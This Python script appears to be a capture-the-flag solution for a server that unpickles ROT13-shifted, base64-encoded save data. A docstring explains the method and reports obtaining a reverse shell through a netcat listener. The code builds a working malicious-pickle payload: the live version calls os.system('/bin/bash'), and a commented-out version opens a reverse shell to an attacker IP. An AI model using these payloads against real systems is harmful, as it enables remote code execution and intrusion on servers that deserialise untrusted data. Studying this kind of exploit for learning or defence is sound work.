import pickle
import base64
import os

"""
NOTE: This script requires Python3.

I put episode 44 on my list of episodes to watch and printed the save file:
>>> tNAqpDOLXDNNNQD0YvOJMJqanJImVTyhVSAjLJAyBvOHnTHtEzIhozIfVRMlo250nJIlpDSuYt==

I thought, maybe they are just pickling the list of episodes and base64 encoding the result.
So, I tried encoding my own list:
>>> base64.b64encode(pickle.dumps(["44. Veggies in Space: The Fennel Frontier"], protocol=3))
>>> gANdcQBYKQAAADQ0LiBWZWdnaWVzIGluIFNwYWNlOiBUaGUgRmVubmVsIEZyb250aWVycQFhLg==

Unfortunately, the strings were different. However, they did have the same length.
I also noticed that the letters appeared to be shifted.
Ex. If I had 'g' in my string, the server had 't'. If I had 'A', the server had 'N'.

So, I wrote a decode function to decode the server's string and see if it matched mine.
It did! So now, I know the format of the pickle data.

Lastly, I just needed to come up with a payload that, when unpickled, would create a reverse shell.
This was a good resource for payloads: https://highon.coffee/blog/reverse-shell-cheat-sheet/
Once I found one, I did the following:

    1. Pickle my exploit.
    2. Base64 encode it.
    3. Shift it to be in the "encrypted" form that the server expects.

Finally, on my own server, I set up a netcat listener:
$ nc -l 6006

And on the victim server, I asked it to unpickle my exploit data.
When it tried, my server received a reverse-shell connection!
Success!
"""

def dec(enc):
    def dec_char(y):
        if ord(y) >= ord('A') and ord(y) <= ord('Z'):
            if ord(y) < ord('N'):
                return chr(ord(y) + 13)
            else:
                return chr(ord(y) - 13)
        elif ord(y) >= ord('a') and ord(y) <= ord('z'):
            if ord(y) < ord('n'):
                return chr(ord(y) + 13)
            else:
                return chr(ord(y) - 13)
        else:
            return y
    return ''.join([dec_char(y) for y in enc])

# Exploit that we want the target to unpickle
# ATTACKER_IP_PORT = '("MY_IP_HERE",6006)'
# class Exploit(object):
#     def __reduce__(self):
#         return (os.system, ("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect({});os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["bash","-i"]);'
# """.format(ATTACKER_IP_PORT),))

# EVEN BETTER PAYLOAD: Just gives a shell directly; no need to route it to my personal IP
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash',))

shellcode = str(base64.b64encode(pickle.dumps(Exploit(), protocol=3))).strip('b\'')
shellcode = dec(shellcode)
print(shellcode)

# If you want to test getting a shell on yourself:
# pickle.loads(base64.b64decode(dec(shellcode)))
